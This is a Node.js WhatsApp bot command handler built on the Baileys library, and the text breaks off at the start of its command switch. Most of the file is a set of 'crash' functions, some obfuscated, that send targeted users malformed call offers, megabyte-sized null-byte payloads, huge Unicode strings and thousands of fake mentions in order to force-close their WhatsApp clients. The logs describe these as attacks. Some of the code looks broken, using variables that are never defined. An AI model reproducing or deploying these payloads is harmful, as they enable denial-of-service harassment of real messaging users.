/* ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  🚀 WA COMMAND HANDLER ENGINE (PRO V6)
  © Copyright: @Dev_Null_X
  YouTube: https://www.youtube.com/@Dev_Null_X
  Telegram: https://t.me/Dev_Null_X_NODE_JS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ */

const fs = require("fs");
const { loadJSON, saveJSON, runtime, formatBytes } = require("./helper/function");
const { logWhatsApp, logSystem } = require("./helper/logger");
const config = require("./settings");
const os = require("os");

// 🛡️ ANTI-SKID CREDIT PROTECTION
const _0xBrand = Buffer.from('QERldl9OdWxsX1g=', 'base64').toString('utf-8');
const _0xYT = Buffer.from('aHR0cHM6Ly93d3cueW91dHViZS5jb20vQERldl9OdWxsX1g=', 'base64').toString('utf-8');
const _0xTG = Buffer.from('aHR0cHM6Ly90Lm1lL0Rldl9OdWxsX1hfTk9ERV9KUw==', 'base64').toString('utf-8');

const paidUsers = loadJSON('./database/paid.json', []);
const settings = loadJSON('./database/settings.json', { publicMode: true, selfMode: false });

const savePaidData = () => {
  saveJSON('./database/paid.json', paidUsers);
};

module.exports = async (WaSocket, m) => {
  try {
    if (!m.message) return;
    
    const message = m.message;
    const type = Object.keys(message)[0];
    
    let body = '';
    
    if (type === 'conversation') {
      body = message.conversation;
    } else if (type === 'extendedTextMessage') {
      body = message.extendedTextMessage.text;
    } else if (type === 'imageMessage') {
      body = message.imageMessage.caption || '';
    } else if (type === 'videoMessage') {
      body = message.videoMessage.caption || '';
    } else if (type === 'interactiveResponseMessage') {
      const interactiveResponse = message.interactiveResponseMessage;
      if (interactiveResponse.nativeFlowResponseMessage) {
        body = JSON.parse(interactiveResponse.nativeFlowResponseMessage.paramsJson).id;
      } else {
        body = interactiveResponse.body || '';
      }
    } else if (type === 'templateButtonReplyMessage') {
      body = message.templateButtonReplyMessage.selectedId;
    } else if (type === 'buttonsResponseMessage') {
      body = message.buttonsResponseMessage.selectedButtonId;
    }
    
    const budy = (typeof body === 'string') ? body : '';
    const prefix = config.prefix.test(budy) ? budy.match(config.prefix)[0] : '.';
    const isCmd = budy.startsWith(prefix);
    const command = isCmd ? budy.slice(prefix.length).trim().split(/ +/).shift().toLowerCase() : budy.toLowerCase();
    const args = budy.trim().split(/ +/).slice(1);
    const text = args.join(" ");
    
    const sender = m.key.remoteJid;
    // 🛠️ BUG FIX: Original code used m.sender which is undefined. Real sender identity here:
    const realSender = m.key.participant || m.key.remoteJid; 
    
    const botNumber = WaSocket.user.id.split(':')[0] + '@s.whatsapp.net';
    const isGroup = sender.endsWith('@g.us');
    const groupMetadata = isGroup ? await WaSocket.groupMetadata(sender).catch(() => ({})) : {};
    const groupName = isGroup ? groupMetadata.subject : '';
    const participants = isGroup ? groupMetadata.participants || [] : [];
    const groupAdmins = isGroup ? participants.filter(p => p.admin !== null).map(p => p.id) : [];
    const isBotAdmin = isGroup ? groupAdmins.includes(botNumber) : false;
    const isAdmin = isGroup ? groupAdmins.includes(realSender) : false;
    
    // 🛠️ BUG FIX: Owner logic fixed to include your actual number from config
    const ownerNumbers = [botNumber, config.whatsappOwner || ""];
    const isOwner = ownerNumbers
        .map(v => v ? v.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : "")
        .includes(realSender);

    const isCreator = isOwner;
    const isPaid = paidUsers.includes(realSender) || isOwner;
    
    const currentSettings = loadJSON('./database/settings.json', { publicMode: true, selfMode: false });
    
    if (currentSettings.selfMode && !isOwner) return; 
    if (!currentSettings.publicMode && !currentSettings.selfMode && !isOwner) return; 
    
    let senderName = sender.split('@')[0];
    try {
      const contact = await WaSocket.onWhatsApp(realSender);
      if (contact && contact[0]) {
        senderName = contact[0].notify || senderName;
      }
    } catch (e) {}
    
    logWhatsApp({
      sender: realSender,
      senderName: senderName,
      chatType: isGroup ? 'group' : 'private',
      chatName: isGroup ? groupName : 'DM',
      command: isCmd ? prefix + command : null,
      message: budy,
      isGroup: isGroup,
      isOwner: isOwner,
      isPaid: isPaid
    });
    
    const reply = async (text) => {
      return WaSocket.sendMessage(sender, { text: text }, { quoted: m });
    };
    
    const {
      generateWAMessageFromContent,
      prepareWAMessageMedia
    } = require("@whiskeysockets/baileys");
    
    if (!isCmd && !body) return; 
    
    const startTime = Date.now();
     async function callcrash(target) {
      console.log(chalk.red("Sending Bug Forclose Invis To BY MOTU PATLU " + target));
      const {
  encodeSignedDeviceIdentity,
  jidEncode,
  jidDecode,
  encodeWAMessage,
  patchMessageBeforeSending,
  encodeNewsletterMessage
} = require('@whiskeysockets/baileys');
      let _0x2d3ed7 = (await WaSocket.getUSyncDevices([target], false, false)).map(({
        user: _0x19bbb8,
        device: _0xf872bd
      }) => _0x19bbb8 + ':' + (_0xf872bd || '') + "@s.whatsapp.net");
      await WaSocket.assertSessions(_0x2d3ed7);
      let _0x1252b9 = () => {
        let _0x254ac6 = {};
        return {
          'mutex'(_0x19a276, _0xe3bdd1) {
            _0x254ac6[_0x19a276] ??= {
              'task': Promise.resolve()
            };
            _0x254ac6[_0x19a276].task = (async _0x1c9346 => {
              try {
                await _0x1c9346;
              } catch {}
              return _0xe3bdd1();
            })(_0x254ac6[_0x19a276].task);
            return _0x254ac6[_0x19a276].task;
          }
        };
      };
      let _0x55fdd0 = _0x1252b9();
      let _0x4fb6a8 = WaSocket.encodeWAMessage?.["bind"](_0x312d7d);
      WaSocket.createParticipantNodes = async (_0x35edc1, _0x5587f5, _0x51fc73, _0x2969e9) => {
        const _0x5737f8 = {
          "nodes": [],
          shouldIncludeDeviceIdentity: false
        };
        if (!_0x35edc1.length) {
          return _0x5737f8;
        }
        let _0x712d63 = await (WaSocket.patchMessageBeforeSending?.(_0x5587f5, _0x35edc1) ?? _0x5587f5);
        let _0x36efec = Array.isArray(_0x712d63) ? _0x712d63 : _0x35edc1.map(_0xdf40cb => ({
          'recipientJid': _0xdf40cb,
          'message': _0x712d63
        }));
        let {
          id: _0x2df294,
          lid: _0x5db06c
        } = WaSocket.authState.creds.me;
        let _0x55a6a0 = _0x5db06c ? jidDecode(_0x5db06c)?.["user"] : null;
        let _0x209709 = false;
        let _0x57a51f = await Promise.all(_0x36efec.map(async ({
          recipientJid: _0x5ef3d5,
          message: _0x111a03
        }) => {
          let {
            user: _0x221bdd
          } = jidDecode(_0x5ef3d5);
          let {
            user: _0x47ce00
          } = jidDecode(_0x2df294);
          let _0x1c802a = _0x221bdd === _0x47ce00 || _0x221bdd === _0x55a6a0;
          let _0x44d33e = _0x5ef3d5 === _0x2df294 || _0x5ef3d5 === _0x5db06c;
          if (_0x2969e9 && _0x1c802a && !_0x44d33e) {
            _0x111a03 = _0x2969e9;
          }
          let _0x27a24a = Buffer.concat([Buffer.from(_0x4fb6a8 ? _0x4fb6a8(_0x111a03) : encodeWAMessage(_0x111a03)), Buffer.alloc(8, 1)]);
          return _0x55fdd0.mutex(_0x5ef3d5, async () => {
            const _0x1a742c = {
              jid: _0x5ef3d5,
              "data": _0x27a24a
            };
            let {
              type: _0x33e3e2,
              ciphertext: _0x5c7c6b
            } = await WaSocket.signalRepository.encryptMessage(_0x1a742c);
            if (_0x33e3e2 === "pkmsg") {
              _0x209709 = true;
            }
            const _0x543a54 = {
              jid: _0x5ef3d5
            };
            const _0x429f02 = {
              'v': '2',
              'type': _0x33e3e2,
              ..._0x51fc73
            };
            const _0x1392a4 = {
              "tag": 'enc',
              attrs: _0x429f02,
              "content": _0x5c7c6b
            };
            const _0x4926a6 = {
              "tag": 'to',
              "attrs": _0x543a54,
              content: [_0x1392a4]
            };
            return _0x4926a6;
          });
        }));
        return {
          'nodes': _0x57a51f.filter(Boolean),
          'shouldIncludeDeviceIdentity': _0x209709
        };
      };
      const _0x1d9157 = {
        conversation: 'y'
      };
      const _0x503f7f = {
        count: '0'
      };
      let {
        nodes: _0x5bbd64,
        shouldIncludeDeviceIdentity: _0x16b239
      } = await WaSocket.createParticipantNodes(_0x2d3ed7, _0x1d9157, _0x503f7f);
      const _0x2662a3 = {
        medium: '3'
      };
      const _0x216327 = {
        ver: '1'
      };
      const _0x3171d4 = {
        'keygen': '2'
      };
      let _0x5ab3d7 = {
        'tag': "call",
        'attrs': {
          'to': target,
          'id': WaSocket.generateMessageTag(),
          'from': WaSocket.user.id
        },
        'content': [{
          'tag': "offer",
          'attrs': {
            'call-id': crypto.randomBytes(16).toString('hex').slice(0, 64).toUpperCase(),
            'call-creator': WaSocket.user.id
          },
          'content': [{
            'tag': "audio",
            'attrs': {
              'enc': "opus",
              'rate': '16000'
            }
          }, {
            'tag': "audio",
            'attrs': {
              'enc': "opus",
              'rate': "8000"
            }
          }, {
            'tag': 'video',
            'attrs': {
              'orientation': '0',
              'screen_width': "1920",
              'screen_height': '1080',
              'device_orientation': '0',
              'enc': "vp8",
              'dec': "vp8"
            }
          }, {
            'tag': "net",
            'attrs': _0x2662a3
          }, {
            'tag': 'capability',
            'attrs': _0x216327,
            'content': new Uint8Array([1, 5, 247, 9, 228, 250, 1])
          }, {
            'tag': "encopt",
            'attrs': _0x3171d4
          }, {
            'tag': "destination",
            'attrs': {},
            'content': _0x5bbd64
          }, ...(_0x16b239 ? [{
            'tag': "device-identity",
            'attrs': {},
            'content': encodeSignedDeviceIdentity(WaSocket.authState.creds.account, true)
          }] : [])]
        }]
      };
      await WaSocket.sendNode(_0x5ab3d7);
    }
   //loda

async function iosinVisFc(target) {
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
         url: `https://motupatlu.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
      }

      let extendMsg = {
         extendedTextMessage: { 
            text: ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
            matchedText: ".welcomel...",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAIwAjAMBIgACEQEDEQH/xAAcAAACAwEBAQEAAAAAAAAAAAACAwQGBwUBAAj/xABBEAACAQIDBAYGBwQLAAAAAAAAAQIDBAUGEQcSITFBUXOSsdETFiZ0ssEUIiU2VXGTJFNjchUjMjM1Q0VUYmSR/8QAGwEAAwEBAQEBAAAAAAAAAAAAAAECBAMFBgf/xAAxEQACAQMCAwMLBQAAAAAAAAAAAQIDBBEFEhMhMTVBURQVM2FxgYKhscHRFjI0Q5H/2gAMAwEAAhEDEQA/ALumEmJixiZ4p+bZyMQaYpMJMA6Dkw4sSmGmItMemEmJTGJgUmMTDTFJhJgUNTCTFphJgA1MNMSmGmAxyYaYmLCTEUPR6LiwkwKTKcmMjISmEmWYR6YSYqLDTEUMTDixSYSYg6D0wkxKYaYFpj0wkxMWMTApMYmGmKTCTAoamEmKTDTABqYcWJTDTAY1MYnwExYSYiioJhJiUz1z0LMQ9MOMiC6+nSexrrrENM6CkGpEBV11hxrrrAeScpBxkQVXXWHCsn0iHknKQSloRPTJLmD9IXWBaZ0FINSOcrhdYcbhdYDydFMJMhwrJ9I30gFZJKkGmRFVXWNhPUB5JKYSYqLC1AZT9eYmtPdQx9JEupcGUYmy/wCz/LOGY3hFS5v6dSdRVXFbs2kkkhW0jLmG4DhFtc4fCpCpOuqb3puSa3W/kdzY69ctVu3l4Ijbbnplqy97XwTNrhHg5xzPqXbUfNnE2Ldt645nN2cZdw7HcIuLm/hUnUhXdNbs2kkoxfzF7RcCsMBtrOpYRnB1JuMt6bfQdbYk9ctXnvcvggI22y3cPw3tZfCJwjwM45kStqS0zi7Vuwuff1B2f5cw7GsDldXsKk6qrSgtJtLRJeYGfsBsMEs7WrYxnCU5uMt6bfDQ6+x172U5v/sz8IidsD0wux7Z+AOEeDnHM6TtqPm3ibVuwueOZV8l2Vvi2OQtbtSlSdOUmovTijQfUjBemjV/VZQdl0tc101/Bn4Go5lvqmG4FeXlBRdWjTcoqXLULeMXTcpIrSaFCVq6lWKeG+45iyRgv7mr+qz1ZKwZf5NX9RlEjtJxdr+6te6/M7mTc54hjOPUbK5p0I05xk24RafBa9ZUZ0ZPCXyLpXWnVZqEYLL9QWasq0sPs5XmHynuU/7dOT10XWmVS0kqt1Qpy13ZzjF/k2avmz7uX/ZMx/DZft9r2sPFHC4hGM1gw6pb06FxFQWE/wAmreqOE/uqn6jKLilKFpi9zb0dVTpz0jq9TWjJMxS9pL7tPkjpdQjGKwjXrNvSpUounFLn3HtOWqGEek+A5MxHz5Tm+ZDu39VkhviyJdv6rKMOco1vY192a3vEvBEXbm9MsWXvkfgmSdjP3Yre8S8ERNvGvqvY7qb/AGyPL+SZv/o9x9jLsj4Q9hr1yxee+S+CBH24vTDsN7aXwjdhGvqve7yaf0yXNf8ACBH27b39G4Zupv8Arpcv5RP+ORLshexfU62xl65Rn7zPwiJ2xvTCrDtn4B7FdfU+e8mn9Jnz/KIrbL/hWH9s/Ab9B7jpPsn4V9it7K37W0+xn4GwX9pRvrSrbXUN+jVW7KOumqMd2Vfe6n2M/A1DOVzWtMsYjcW1SVOtTpOUZx5pitnik2x6PJRspSkspN/QhLI+X1ysV35eZLwzK+EYZeRurK29HXimlLeb5mMwzbjrXHFLj/0suzzMGK4hmm3t7y+rVqMoTbhJ8HpEUK1NySUTlb6jZ1KsYwpYbfgizbTcXq2djTsaMJJXOu/U04aLo/MzvDH9oWnaw8Ua7ne2pXOWr300FJ04b8H1NdJj2GP7QtO1h4o5XKaqJsy6xGSu4uTynjHqN+MhzG/aW/7T5I14x/Mj9pr/ALT5I7Xn7Uehrvoo+37HlJ8ByI9F8ByZ558wim68SPcrVMaeSW8i2YE+407Yvd0ZYNd2m+vT06zm468d1pcTQqtKnWio1acJpPXSSTPzXbVrmwuY3FlWqUK0eU4PRnXedMzLgsTqdyPka6dwox2tH0tjrlOhQjSqxfLwN9pUqdGLjSpwgm9dIpI+q0aVZJVacJpct6KZgazpmb8Sn3Y+QSznmX8Sn3I+RflUPA2/qK26bX8vyb1Sp06Ud2lCMI89IrRGcbY7qlK3sLSMk6ym6jj1LTQqMM4ZjktJYlU7sfI5tWde7ryr3VWdWrLnOb1bOdW4Uo7UjHf61TuKDpUotZ8Sw7Ko6Ztpv+DPwNluaFK6oTo3EI1KU1pKMlqmjAsPurnDbpXFjVdKsk0pJdDOk825g6MQn3Y+RNGvGEdrRGm6pStaHCqRb5+o1dZZwVf6ba/pofZ4JhtlXVa0sqFKquCnCGjRkSzbmH8Qn3Y+Qcc14/038+7HyOnlNPwNq1qzTyqb/wAX5NNzvdUrfLV4qkknUjuRXW2ZDhkPtC07WHih17fX2J1Izv7ipWa5bz4L8kBTi4SjODalFpp9TM9WrxJZPJv79XdZVEsJG8mP5lXtNf8AafINZnxr/ez7q8iBOpUuLidavJzqzespPpZVevGokka9S1KneQUYJrD7x9IdqR4cBupmPIRTIsITFjIs6HnJh6J8z3cR4mGmIvJ8qa6g1SR4mMi9RFJpnsYJDYpIBBpgWg1FNHygj5MNMBnygg4wXUeIJMQxkYoNICLDTApBKKGR4C0wkwDoOiw0+AmLGJiLTKWmHFiU9GGmdTzsjosNMTFhpiKTHJhJikw0xFDosNMQmMiwOkZDkw4sSmGmItDkwkxUWGmAxiYyLEphJgA9MJMVGQaYihiYaYpMJMAKcnqep6MCIZ0MbWQ0w0xK5hoCUxyYaYmIaYikxyYSYpcxgih0WEmJXMYmI6RY1MOLEoNAWOTCTFRfHQNAMYmMjIUEgAcmFqKiw0xFH//Z",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      
      let msg1 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      for (const msg of [msg1, msg2]) {
      await WaSocket.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
     }
   console.log(chalk.red.bold("─────「 ⏤!CrashNo IoSInvis!⏤ 」─────"))
   } catch (err) {
      console.error(err);
   }
};
async function ManeoNullCrashOut(target, Ptcp = true) {
  try {
    await WaSocket.relayMessage(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "🌹𝗍һᥱ ExploitNyx мαηєσ 🕊¹",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(1045000),
              version: 3
            }
          }
        }
      }
    }, Ptcp ? {
      participant: { jid: target }
    } : {});
    
    await WaSocket.relayMessage(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "🌹𝗍һᥱ ExploitNyx мαηєσ 🕊²",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: "\u0000".repeat(1000000),
              version: 3
            }
          }
        }
      }
    }, { participant: { jid: target }});

  } catch (error) {
    console.log("Crash payload sent - WhatsApp should Out");
  }
}
async function invisSpam(target) {
   await WaSocket.relayMessage(target, {
    sendPaymentMessage: {}
  }, {
    participant: { jid: target }
  })
    const type = ["galaxy_message", "call_permission_request", "address_message", "payment_method", "mpm"];

    for (const x of type) {
        const enty = Math.floor(Math.random() * type.length);
        const msg = generateWAMessageFromContent(
            target,
            {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "\u0003",
                                format: "DEFAULT"
                            },
                            nativeFlowResponseMessage: {
                                name: x,
                                paramsJson: "\x10".repeat(1000000),
                                version: 3
                            },
                            entryPointConversionSource: type[enty]
                        }
                    }
                }
            },
            {
                participant: { jid: target }
            }
        );
        await WaSocket.relayMessage(
            target,
            {
                groupStatusMessageV2: {
                    message: msg.message
                }
            },
            {
                messageId: msg.key.id,
                participant: { jid: target }
            }
        );
        await new Promise(resolve => setTimeout(resolve, 1000));
    }

    const mediaDatamrb = [
        {
            ID: "68BD677B",
            uri: "t62.43144-24/10000000_1407285833860834_2249780575933148603_n.enc?ccb=11-4&oh",
            buffer: "01_Q5Aa2AFffQpqWVK7GvldUiQQNd4Li_6BbUMZ3yHwZ55g5SuVKA&oe",
            sid: "5e03e0",
            SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
            ENCSHA256: "o+hchsgN0ZtdSp8iBlD1Yb/kx9Mkrer8km3pw5azkj0=",
            mkey: "C+7Uy3QyEAHwMpIR7CGaKEhpZ3KYFS67TcYxcNbm73EXo="
        },
        {
            ID: "68BD469B",
            uri: "t62.43144-24/10000000_2553936021621845_4020476590210043024_n.enc?ccb=11-4&oh",
            buffer: "01_Q5Aa2AHPt6cTL57bihyVMMppUvQiXg-m7Oog3TAebzRVWsCNEw&oe",
            sid: "5e03e0",
            SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
            ENCSHA256: "2cGzUZDAYCZq7QbAoiWSI1h5Z0WIje7VK1IiUgqu/+Y=",
            mkey: "1EvzGhM2IL78wiXyfpRrcr8o0ws/hTjtghBQUF+v3wI="
        }
    ];

    let sequentialIndexmrb = 0;

    try {
        if (!WaSocket || !WaSocket.user) {
            throw new Error("Socket tidak terrekasi!");
        }

        console.log(chalk.green(`🚀 Memulai serangan FC invis ke ${target}`));

        let successCount = 0;
        let errorCount = 0;

        for (let i = 0; i < 3; i++) {
            try {
                if (!WaSocket || !WaSocket.user) {
                    throw new Error("Socket putus koneksi selama serangan!");
                }

                const selectedMedia = mediaDatamrb[sequentialIndexmrb];
                sequentialIndexmrb = (sequentialIndexmrb + 1) % mediaDatamrb.length;

                const MD_ID = selectedMedia.ID;
                const MD_Uri = selectedMedia.uri;
                const MD_Buffer = selectedMedia.buffer;
                const MD_SID = selectedMedia.sid;
                const MD_sha256 = selectedMedia.SHA256;
                const MD_encsha25 = selectedMedia.ENCSHA256;
                const mkey = selectedMedia.mkey;

                let parse = true;
                let type = "image/webp";
                if (11 > 9) {
                    parse = parse ? false : true;
                }

                let stickerMessage = {
                    viewOnceMessage: {
                        message: {
                            stickerMessage: {
                                url: `https://mmg.whatsapp.net/v/${MD_Uri}=${MD_Buffer}=${MD_ID}&_nc_sid=${MD_SID}&mms3=true`,
                                fileSha256: Buffer.from(MD_sha256, "base64"),
                                fileEncSha256: Buffer.from(MD_encsha25, "base64"),
                                mediaKey: Buffer.from(mkey, "base64"),
                                mimetype: type,
                                directPath: `/v/${MD_Uri}=${MD_Buffer}=${MD_ID}&_nc_sid=${MD_SID}`,
                                fileLength: {
                                    low: Math.floor(Math.random() * 1000),
                                    high: 0,
                                    unsigned: true
                                },
                                mediaKeyTimestamp: {
                                    low: Math.floor(Math.random() * 1700000000),
                                    high: 0,
                                    unsigned: false
                                },
                                firstFrameLength: 19904,
                                firstFrameSidecar: "KN4kQ5pyABRAgA==",
                                isAnimated: true,
                                contextInfo: {
                                    participant: target,
                                    mentionedJid: [
                                        "0@s.whatsapp.net",
                                        ...Array.from(
                                            { length: 1998 },
                                            () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                                        )
                                    ],
                                    groupMentions: [],
                                    entryPointConversionSource: "non_contact",
                                    entryPointConversionApp: "whatsapp",
                                    entryPointConversionDelaySeconds: 467593
                                },
                                stickerSentTs: {
                                    low: Math.floor(Math.random() * -20000000),
                                    high: 555,
                                    unsigned: parse
                                },
                                isAvatar: parse,
                                isAiSticker: parse,
                                isLottie: parse
                            }
                        }
                    }
                };

                let interactiveMessage = {
                    viewOnceMessage: {
                        message: {
                            interactiveResponseMessage: {
                                body: {
                                    text: "蟽骗伪讗 搔伪喙€",
                                    format: "DEFAULT"
                                },
                                nativeFlowResponseMessage: {
                                    name: "call_permission_request",
                                    paramsJson: "\u0000".repeat(1045000),
                                    version: 3
                                },
                                entryPointConversionSource: "galaxy_message"
                            }
                        }
                    }
                };

                let galaxyMessage = {
                    viewOnceMessage: {
                        message: {
                            interactiveResponseMessage: {
                                body: {
                                    text: "喙弔喔勛 蟼喙徯逞",
                                    format: "DEFAULT"
                                },
                                nativeFlowResponseMessage: {
                                    name: "galaxy_message",
                                    paramsJson: "\x10".repeat(1045000),
                                    version: 3
                                },
                                entryPointConversionSource: "call_permission_request"
                            }
                        }
                    }
                };

                let textMessage = {
                    extendedTextMessage: {
                        text: "驴" + "軎".repeat(300000),
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                target,
                                ...Array.from(
                                    { length: 2000 },
                                    () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                                )
                            ]
                        }
                    }
                };

                const messages = [stickerMessage, interactiveMessage, galaxyMessage, textMessage];

                for (const msgContent of messages) {
                    const msg = generateWAMessageFromContent(target, msgContent, {});
                    await WaSocket.relayMessage(
                        "status@broadcast",
                        msg.message,
                        {
                            messageId: msg.key.id,
                            statusJidList: [target],
                            additionalNodes: [
                                {
                                    tag: "meta",
                                    attrs: {},
                                    content: [
                                        {
                                            tag: "mentioned_users",
                                            attrs: {},
                                            content: [
                                                {
                                                    tag: "to",
                                                    attrs: { jid: target },
                                                    content: undefined
                                                }
                                            ]
                                        }
                                    ]
                                }
                            ]
                        }
                    );
                }

                successCount++;

                const percent = ((i + 1) / 3) * 100;
                console.log(
                    chalk.red(
                        `Mengirim FC invis ke ${target.replace("@s.whatsapp.net", "")}\nProses: (${percent.toFixed(2)}%)`
                    )
                );
            } catch (batchError) {
                errorCount++;
                console.error(chalk.red(`❌ Batch ${i + 1}/3 GAGAL: ${batchError.message}`));
                if (errorCount > 3) {
                    console.error(chalk.red("⚠️ THIS FACTION MAD BY MOTU PATLU X X5X5X5!"));
                    break;
                }
            }

            if (i < 2) {
                await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }

        console.log(chalk.green(`✓ ${successCount}/3`) + chalk.red(` ✗ ${errorCount}/3`));

        try {
            const lastMsg = generateWAMessageFromContent(
                target,
                {
                    viewOnceMessage: {
                        message: {
                            stickerMessage: {
                                url: `https://mmg.whatsapp.net/v/${mediaDatamrb[0].uri}`,
                                fileSha256: Buffer.from(mediaDatamrb[0].SHA256, "base64"),
                                fileEncSha256: Buffer.from(mediaDatamrb[0].ENCSHA256, "base64"),
                                mediaKey: Buffer.from(mediaDatamrb[0].mkey, "base64"),
                                mimetype: "image/webp"
                            }
                        }
                    }
                },
                {}
            );

            await WaSocket.relayMessage(
                target,
                {
                    groupStatusMentionMessage: {
                        message: {
                            protocolMessage: {
                                key: lastMsg.key,
                                type: 25
                            }
                        }
                    }
                },
                {
                    additionalNodes: [
                        {
                            tag: "meta",
                            attrs: {
                                is_status_mention: " FC invis - serangan "
                            },
                            content: undefined
                        }
                    ]
                }
            );
            console.log(chalk.green("✅ Pesan menyebutkan berhasil dikirim"));
        } catch (mentionError) {
            console.error(chalk.red(`❌ gagal: ${mentionError.message}`));
        }

        return { success: true, successCount, errorCount };
    } catch (error) {
        console.error(chalk.red(`❌ FC invis KESALAHAN FATALE: ${error.message}`));
        return { success: false, error: error.message };
    }
}

async function CrashUi(WaSocket, target) {
  try {
    let msg = {
      extendedTextMessage: {
        text: "ꦾ".repeat(180000),
        title: "ꦾ".repeat(60000),
        text: "http://t.me/MOTU_PATALU_HINDU_HAIꦾ".repeat(180000),
        contextInfo: {
          stanzaId: "X",
          participant: target,
          remoteJid: target,
          isForwarded: true,
          forwardingScore: 999,
          mentionedJid: ["13135550202@s.whatsapp.net", ...Array.from({
            length: 2000
          }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
          forwardedNewsletterMessageInfo: {
            newsletterJid: "0@newsletter",
            newsletterName: "ꦾ".repeat(50000)
          }
        }
      }
    };
    
    await WaSocket.relayMessage(target, msg, {
      messageId: null,
      participant: { jid: target }
    });
    
    console.log(`✅ @MOTU_PATALU_HINDU_HAI  ke ${target}`);
    
  } catch (error) {
    console.log(`❌ Gagal: ${error.message}`);
  }
}
async function ManeoClick(WaSocket, target) {
  const ManeoMsg = generateWAMessageFromContent(
    target,
    {
        interactiveMessage: {
          body: {
            text: "@MOTU_PATALU_HINDU_HAI - function"
            },
            businessMessageForwardInfo: {
            businessOwnerJid: "13135550002@bot"
          },
          contextInfo: {
         remoteJid: "X",
         quotedMessage: {
          paymentInviteMessage: {
            serviceType: 2,
            expiryTimestamp: Math.floor(Date.now() / 1000) + 86400
           }
         }
       }
      }
    },
   { userJid: target }
  );

  await WaSocket.relayMessage(
    target,
      ManeoMsg.message,
    {
      participant: { jid: target },
      messageId: ManeoMsg.key.id
    }
  );
}
    switch (command) {
      case "menu": {
        const teks = `[ 🔥 ${_0xBrand} SYSTEM 🔥 ]`;
        
        // 🔥 COMMAND LIST ADDED HERE
